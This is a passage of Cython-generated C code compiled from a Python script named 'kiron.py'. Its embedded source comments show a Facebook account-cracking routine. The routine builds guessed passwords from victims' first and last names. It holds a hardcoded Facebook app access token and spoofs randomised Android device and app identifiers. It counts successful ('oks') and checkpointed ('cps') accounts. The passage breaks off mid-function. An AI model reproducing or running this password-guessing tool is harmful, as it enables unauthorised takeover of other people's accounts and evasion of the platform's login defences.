  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "kiron.py":467
 *             time.sleep(10)
 * #__________________| FILE METHOD M1 |__________________#
 * def api1(ids,names,passlist):             # <<<<<<<<<<<<<<
 *         try:
 *                 global oks,loop,sim_id,device
 */

static PyObject *__pyx_pf_5kiron_28api1(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_ids, PyObject *__pyx_v_names, PyObject *__pyx_v_passlist) {
  PyObject *__pyx_v_fn = NULL;
  PyObject *__pyx_v_ln = NULL;
  PyObject *__pyx_v_pw = NULL;
  PyObject *__pyx_v_pas = NULL;
  PyObject *__pyx_v_accessToken = NULL;
  PyObject *__pyx_v_fbav = NULL;
  PyObject *__pyx_v_fbbv = NULL;
  PyObject *__pyx_v_android_version = NULL;
  PyObject *__pyx_v_model = NULL;
  PyObject *__pyx_v_build = NULL;
  PyObject *__pyx_v_fblc = NULL;
  PyObject *__pyx_v_fbcr = NULL;
  PyObject *__pyx_v_fbmf = NULL;
  PyObject *__pyx_v_fbbd = NULL;
  PyObject *__pyx_v_fbdv = NULL;
  PyObject *__pyx_v_fbsv = NULL;
  PyObject *__pyx_v_fbca = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_fbdm = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_fbfw = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_fbrv = NULL;
  PyObject *__pyx_v_fban = NULL;
  PyObject *__pyx_v_fbpn = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_ua = NULL;
  PyObject *__pyx_v_random_seed = NULL;
  PyObject *__pyx_v_adid = NULL;
  PyObject *__pyx_v_device_id = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_secure = NULL;
  PyObject *__pyx_v_family = NULL;
  PyObject *__pyx_v_xd = NULL;
  PyObject *__pyx_v_sim_serials = NULL;
  PyObject *__pyx_v_li = NULL;
  PyObject *__pyx_v_li2 = NULL;
  PyObject *__pyx_v_j1 = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_jazoest = NULL;
  PyObject *__pyx_v_data = NULL;
  PyObject *__pyx_v_headers = NULL;
  PyObject *__pyx_v_url = NULL;
  PyObject *__pyx_v_po = NULL;
  PyObject *__pyx_v_coki = NULL;
  PyObject *__pyx_gb_5kiron_4api1_2generator1 = 0;
  PyObject *__pyx_gb_5kiron_4api1_5generator2 = 0;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  Py_ssize_t __pyx_t_7;
  Py_UCS4 __pyx_t_8;
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  PyObject *__pyx_t_11 = NULL;
  PyObject *__pyx_t_12 = NULL;
  int __pyx_t_13;
  PyObject *__pyx_t_14 = NULL;
  PyObject *__pyx_t_15 = NULL;
  PyObject *__pyx_t_16 = NULL;
  PyObject *(*__pyx_t_17)(PyObject *);
  PyObject *__pyx_t_18 = NULL;
  PyObject *__pyx_t_19 = NULL;
  PyObject *__pyx_t_20 = NULL;
  PyObject *__pyx_t_21 = NULL;
  Py_ssize_t __pyx_t_22;
  int __pyx_t_23;
  int __pyx_t_24;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("api1", 1);

  /* "kiron.py":468
 * #__________________| FILE METHOD M1 |__________________#
 * def api1(ids,names,passlist):
 *         try:             # <<<<<<<<<<<<<<
 *                 global oks,loop,sim_id,device
 *                 sys.stdout.write(f'\r\r\x1b[38;5;244m[\x1b[38;5;46m{date}\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;244m[\x1b[38;5;46m%s\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;244m[\x1b[38;5;46m%s\x1b[38;5;244m|\x1b[1;91m%s\x1b[38;5;244m] '%(loop,len(oks),len(cps)));sys.stdout.flush()
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      /* "kiron.py":470
 *         try:
 *                 global oks,loop,sim_id,device
 *                 sys.stdout.write(f'\r\r\x1b[38;5;244m[\x1b[38;5;46m{date}\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;244m[\x1b[38;5;46m%s\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;244m[\x1b[38;5;46m%s\x1b[38;5;244m|\x1b[1;91m%s\x1b[38;5;244m] '%(loop,len(oks),len(cps)));sys.stdout.flush()             # <<<<<<<<<<<<<<
 *                 fn = names.split(' ')[0]
 *                 try:
 */
      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_sys); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 470, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_stdout); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 470, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_write); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 470, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = PyTuple_New(3); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 470, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_7 = 0;
      __pyx_t_8 = 127;
      __Pyx_INCREF(__pyx_kp_u_38_5_244m_38_5_46m_6);
      __pyx_t_7 += 24;
      __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_38_5_46m_6);
      PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_kp_u_38_5_244m_38_5_46m_6);
      __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_date); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 470, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __pyx_t_10 = __Pyx_PyObject_FormatSimple(__pyx_t_9, __pyx_empty_unicode); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 470, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_8 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) > __pyx_t_8) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) : __pyx_t_8;
      __pyx_t_7 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10);
      __Pyx_GIVEREF(__pyx_t_10);
      PyTuple_SET_ITEM(__pyx_t_6, 1, __pyx_t_10);
      __pyx_t_10 = 0;
      __Pyx_INCREF(__pyx_kp_u_38_5_244m_38_5_46m_38_5_244m_38);
      __pyx_t_7 += 128;
      __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_38_5_46m_38_5_244m_38);
      PyTuple_SET_ITEM(__pyx_t_6, 2, __pyx_kp_u_38_5_244m_38_5_46m_38_5_244m_38);
      __pyx_t_10 = __Pyx_PyUnicode_Join(__pyx_t_6, 3, __pyx_t_7, __pyx_t_8); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 470, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_loop); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 470, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_oks); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 470, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __pyx_t_7 = PyObject_Length(__pyx_t_9); if (unlikely(__pyx_t_7 == ((Py_ssize_t)-1))) __PYX_ERR(0, 470, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_9 = PyInt_FromSsize_t(__pyx_t_7); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 470, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_cps); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 470, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_11);
      __pyx_t_7 = PyObject_Length(__pyx_t_11); if (unlikely(__pyx_t_7 == ((Py_ssize_t)-1))) __PYX_ERR(0, 470, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      __pyx_t_11 = PyInt_FromSsize_t(__pyx_t_7); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 470, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_11);
      __pyx_t_12 = PyTuple_New(3); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 470, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_12);
      __Pyx_GIVEREF(__pyx_t_6);
      if (__Pyx_PyTuple_SET_ITEM(__pyx_t_12, 0, __pyx_t_6)) __PYX_ERR(0, 470, __pyx_L3_error);
      __Pyx_GIVEREF(__pyx_t_9);
      if (__Pyx_PyTuple_SET_ITEM(__pyx_t_12, 1, __pyx_t_9)) __PYX_ERR(0, 470, __pyx_L3_error);
      __Pyx_GIVEREF(__pyx_t_11);
      if (__Pyx_PyTuple_SET_ITEM(__pyx_t_12, 2, __pyx_t_11)) __PYX_ERR(0, 470, __pyx_L3_error);
      __pyx_t_6 = 0;
      __pyx_t_9 = 0;
      __pyx_t_11 = 0;
      __pyx_t_11 = PyUnicode_Format(__pyx_t_10, __pyx_t_12); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 470, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_11);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
      __pyx_t_12 = NULL;
      __pyx_t_13 = 0;
      #if CYTHON_UNPACK_METHODS
      if (likely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_12)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_12);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
          __pyx_t_13 = 1;
        }
      }
      #endif
      {
        PyObject *__pyx_callargs[2] = {__pyx_t_12, __pyx_t_11};
        __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_13, 1+__pyx_t_13);
        __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 470, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      }
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_sys); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 470, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_stdout); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 470, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_11);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_flush); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 470, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      __pyx_t_11 = NULL;
      __pyx_t_13 = 0;
      #if CYTHON_UNPACK_METHODS
      if (likely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_11)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_11);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
          __pyx_t_13 = 1;
        }
      }
      #endif
      {
        PyObject *__pyx_callargs[2] = {__pyx_t_11, NULL};
        __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_13, 0+__pyx_t_13);
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 470, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      }
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      /* "kiron.py":471
 *                 global oks,loop,sim_id,device
 *                 sys.stdout.write(f'\r\r\x1b[38;5;244m[\x1b[38;5;46m{date}\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;244m[\x1b[38;5;46m%s\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;244m[\x1b[38;5;46m%s\x1b[38;5;244m|\x1b[1;91m%s\x1b[38;5;244m] '%(loop,len(oks),len(cps)));sys.stdout.flush()
 *                 fn = names.split(' ')[0]             # <<<<<<<<<<<<<<
 *                 try:
 *                         ln = names.split(' ')[1]
 */
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_names, __pyx_n_s_split); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 471, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_11 = NULL;
      __pyx_t_13 = 0;
      #if CYTHON_UNPACK_METHODS
      if (likely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_11)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_11);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
          __pyx_t_13 = 1;
        }
      }
      #endif
      {
        PyObject *__pyx_callargs[2] = {__pyx_t_11, __pyx_kp_s__25};
        __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_13, 1+__pyx_t_13);
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 471, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      }
      __pyx_t_5 = __Pyx_GetItemInt(__pyx_t_4, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 471, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_v_fn = __pyx_t_5;
      __pyx_t_5 = 0;

      /* "kiron.py":472
 *                 sys.stdout.write(f'\r\r\x1b[38;5;244m[\x1b[38;5;46m{date}\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;244m[\x1b[38;5;46m%s\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;244m[\x1b[38;5;46m%s\x1b[38;5;244m|\x1b[1;91m%s\x1b[38;5;244m] '%(loop,len(oks),len(cps)));sys.stdout.flush()
 *                 fn = names.split(' ')[0]
 *                 try:             # <<<<<<<<<<<<<<
 *                         ln = names.split(' ')[1]
 *                 except:
 */
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_14, &__pyx_t_15, &__pyx_t_16);
        __Pyx_XGOTREF(__pyx_t_14);
        __Pyx_XGOTREF(__pyx_t_15);
        __Pyx_XGOTREF(__pyx_t_16);
        /*try:*/ {

          /* "kiron.py":473
 *                 fn = names.split(' ')[0]
 *                 try:
 *                         ln = names.split(' ')[1]             # <<<<<<<<<<<<<<
 *                 except:
 *                         ln = fn
 */
          __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_names, __pyx_n_s_split); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 473, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_t_11 = NULL;
          __pyx_t_13 = 0;
          #if CYTHON_UNPACK_METHODS
          if (likely(PyMethod_Check(__pyx_t_4))) {
            __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_4);
            if (likely(__pyx_t_11)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
              __Pyx_INCREF(__pyx_t_11);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_4, function);
              __pyx_t_13 = 1;
            }
          }
          #endif
          {
            PyObject *__pyx_callargs[2] = {__pyx_t_11, __pyx_kp_s__25};
            __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_13, 1+__pyx_t_13);
            __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
            if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 473, __pyx_L9_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          }
          __pyx_t_4 = __Pyx_GetItemInt(__pyx_t_5, 1, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 473, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          __pyx_v_ln = __pyx_t_4;
          __pyx_t_4 = 0;

          /* "kiron.py":472
 *                 sys.stdout.write(f'\r\r\x1b[38;5;244m[\x1b[38;5;46m{date}\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;244m[\x1b[38;5;46m%s\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;244m[\x1b[38;5;46m%s\x1b[38;5;244m|\x1b[1;91m%s\x1b[38;5;244m] '%(loop,len(oks),len(cps)));sys.stdout.flush()
 *                 fn = names.split(' ')[0]
 *                 try:             # <<<<<<<<<<<<<<
 *                         ln = names.split(' ')[1]
 *                 except:
 */
        }
        __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
        __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
        __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
        goto __pyx_L14_try_end;
        __pyx_L9_error:;
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

        /* "kiron.py":474
 *                 try:
 *                         ln = names.split(' ')[1]
 *                 except:             # <<<<<<<<<<<<<<
 *                         ln = fn
 *                 for pw in passlist:
 */
        /*except:*/ {
          __Pyx_AddTraceback("kiron.api1", __pyx_clineno, __pyx_lineno, __pyx_filename);
          if (__Pyx_GetException(&__pyx_t_4, &__pyx_t_5, &__pyx_t_11) < 0) __PYX_ERR(0, 474, __pyx_L11_except_error)
          __Pyx_XGOTREF(__pyx_t_4);
          __Pyx_XGOTREF(__pyx_t_5);
          __Pyx_XGOTREF(__pyx_t_11);

          /* "kiron.py":475
 *                         ln = names.split(' ')[1]
 *                 except:
 *                         ln = fn             # <<<<<<<<<<<<<<
 *                 for pw in passlist:
 *                         pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
 */
          __Pyx_INCREF(__pyx_v_fn);
          __Pyx_XDECREF_SET(__pyx_v_ln, __pyx_v_fn);
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
          goto __pyx_L10_exception_handled;
        }

        /* "kiron.py":472
 *                 sys.stdout.write(f'\r\r\x1b[38;5;244m[\x1b[38;5;46m{date}\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;244m[\x1b[38;5;46m%s\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;244m[\x1b[38;5;46m%s\x1b[38;5;244m|\x1b[1;91m%s\x1b[38;5;244m] '%(loop,len(oks),len(cps)));sys.stdout.flush()
 *                 fn = names.split(' ')[0]
 *                 try:             # <<<<<<<<<<<<<<
 *                         ln = names.split(' ')[1]
 *                 except:
 */
        __pyx_L11_except_error:;
        __Pyx_XGIVEREF(__pyx_t_14);
        __Pyx_XGIVEREF(__pyx_t_15);
        __Pyx_XGIVEREF(__pyx_t_16);
        __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_15, __pyx_t_16);
        goto __pyx_L3_error;
        __pyx_L10_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_14);
        __Pyx_XGIVEREF(__pyx_t_15);
        __Pyx_XGIVEREF(__pyx_t_16);
        __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_15, __pyx_t_16);
        __pyx_L14_try_end:;
      }

      /* "kiron.py":476
 *                 except:
 *                         ln = fn
 *                 for pw in passlist:             # <<<<<<<<<<<<<<
 *                         pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 */
      if (likely(PyList_CheckExact(__pyx_v_passlist)) || PyTuple_CheckExact(__pyx_v_passlist)) {
        __pyx_t_11 = __pyx_v_passlist; __Pyx_INCREF(__pyx_t_11);
        __pyx_t_7 = 0;
        __pyx_t_17 = NULL;
      } else {
        __pyx_t_7 = -1; __pyx_t_11 = PyObject_GetIter(__pyx_v_passlist); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 476, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_11);
        __pyx_t_17 = __Pyx_PyObject_GetIterNextFunc(__pyx_t_11); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 476, __pyx_L3_error)
      }
      for (;;) {
        if (likely(!__pyx_t_17)) {
          if (likely(PyList_CheckExact(__pyx_t_11))) {
            {
              Py_ssize_t __pyx_temp = __Pyx_PyList_GET_SIZE(__pyx_t_11);
              #if !CYTHON_ASSUME_SAFE_MACROS
              if (unlikely((__pyx_temp < 0))) __PYX_ERR(0, 476, __pyx_L3_error)
              #endif
              if (__pyx_t_7 >= __pyx_temp) break;
            }
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_5 = PyList_GET_ITEM(__pyx_t_11, __pyx_t_7); __Pyx_INCREF(__pyx_t_5); __pyx_t_7++; if (unlikely((0 < 0))) __PYX_ERR(0, 476, __pyx_L3_error)
            #else
            __pyx_t_5 = __Pyx_PySequence_ITEM(__pyx_t_11, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 476, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_5);
            #endif
          } else {
            {
              Py_ssize_t __pyx_temp = __Pyx_PyTuple_GET_SIZE(__pyx_t_11);
              #if !CYTHON_ASSUME_SAFE_MACROS
              if (unlikely((__pyx_temp < 0))) __PYX_ERR(0, 476, __pyx_L3_error)
              #endif
              if (__pyx_t_7 >= __pyx_temp) break;
            }
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_5 = PyTuple_GET_ITEM(__pyx_t_11, __pyx_t_7); __Pyx_INCREF(__pyx_t_5); __pyx_t_7++; if (unlikely((0 < 0))) __PYX_ERR(0, 476, __pyx_L3_error)
            #else
            __pyx_t_5 = __Pyx_PySequence_ITEM(__pyx_t_11, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 476, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_5);
            #endif
          }
        } else {
          __pyx_t_5 = __pyx_t_17(__pyx_t_11);
          if (unlikely(!__pyx_t_5)) {
            PyObject* exc_type = PyErr_Occurred();
            if (exc_type) {
              if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
              else __PYX_ERR(0, 476, __pyx_L3_error)
            }
            break;
          }
          __Pyx_GOTREF(__pyx_t_5);
        }
        __Pyx_XDECREF_SET(__pyx_v_pw, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "kiron.py":477
 *                         ln = fn
 *                 for pw in passlist:
 *                         pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())             # <<<<<<<<<<<<<<
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 *                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
 */
        __pyx_t_18 = __Pyx_PyObject_GetAttrStr(__pyx_v_pw, __pyx_n_s_replace); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 477, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __pyx_t_20 = __Pyx_PyObject_GetAttrStr(__pyx_v_fn, __pyx_n_s_lower); if (unlikely(!__pyx_t_20)) __PYX_ERR(0, 477, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_20);
        __pyx_t_21 = NULL;
        __pyx_t_13 = 0;
        #if CYTHON_UNPACK_METHODS
        if (likely(PyMethod_Check(__pyx_t_20))) {
          __pyx_t_21 = PyMethod_GET_SELF(__pyx_t_20);
          if (likely(__pyx_t_21)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_20);
            __Pyx_INCREF(__pyx_t_21);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_20, function);
            __pyx_t_13 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_21, NULL};
          __pyx_t_19 = __Pyx_PyObject_FastCall(__pyx_t_20, __pyx_callargs+1-__pyx_t_13, 0+__pyx_t_13);
          __Pyx_XDECREF(__pyx_t_21); __pyx_t_21 = 0;
          if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 477, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_19);
          __Pyx_DECREF(__pyx_t_20); __pyx_t_20 = 0;
        }
        __pyx_t_20 = NULL;
        __pyx_t_13 = 0;
        #if CYTHON_UNPACK_METHODS
        if (likely(PyMethod_Check(__pyx_t_18))) {
          __pyx_t_20 = PyMethod_GET_SELF(__pyx_t_18);
          if (likely(__pyx_t_20)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_18);
            __Pyx_INCREF(__pyx_t_20);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_18, function);
            __pyx_t_13 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[3] = {__pyx_t_20, __pyx_n_s_first, __pyx_t_19};
          __pyx_t_6 = __Pyx_PyObject_FastCall(__pyx_t_18, __pyx_callargs+1-__pyx_t_13, 2+__pyx_t_13);
          __Pyx_XDECREF(__pyx_t_20); __pyx_t_20 = 0;
          __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
          if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 477, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        }
        __pyx_t_18 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_replace); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 477, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = NULL;
        __pyx_t_13 = 0;
        #if CYTHON_UNPACK_METHODS
        if (likely(PyMethod_Check(__pyx_t_18))) {
          __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_18);
          if (likely(__pyx_t_6)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_18);
            __Pyx_INCREF(__pyx_t_6);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_18, function);
            __pyx_t_13 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[3] = {__pyx_t_6, __pyx_n_s_First, __pyx_v_fn};
          __pyx_t_9 = __Pyx_PyObject_FastCall(__pyx_t_18, __pyx_callargs+1-__pyx_t_13, 2+__pyx_t_13);
